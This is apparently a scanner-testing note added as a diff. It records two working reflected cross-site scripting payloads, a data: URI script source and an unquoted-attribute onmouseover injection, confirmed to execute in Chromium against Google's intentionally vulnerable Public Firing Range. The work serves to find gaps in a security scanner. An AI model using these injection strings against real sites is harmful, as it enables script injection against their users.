@@ -1,0 +1,22 @@
+SV1 1.5.1 - manual Chromium checks for the two actionable missed contexts
+Date: 2026-10-28
+Target: https://public-firing-range.appspot.com/reflected/
+
+1) script_src
+URL:
+https://public-firing-range.appspot.com/reflected/url/script_src?q=data:text/javascript,alert('sv1proof')
+Rendered response:
+<script src="data:text/javascript,alert('sv1proof')"></script>
+Chromium init-script hook recorded:
+alert:sv1proof
+
+2) filteredcharsets/attribute_unquoted/DoubleQuoteSinglequote
+URL:
+https://public-firing-range.appspot.com/reflected/filteredcharsets/attribute_unquoted/DoubleQuoteSinglequote?q=x%20onmouseover%3Dalert(%2Fsv1proof%2F)%20x%3D
+Rendered response:
+<tag attribute=x onmouseover=alert(/sv1proof/) x=>
+After dispatching mouseover, Chromium recorded:
+alert:/sv1proof/
+
+These are manual checks, not SV1 findings. They prove the two contexts are
+executable in current Chromium and that the misses are payload-shape gaps.
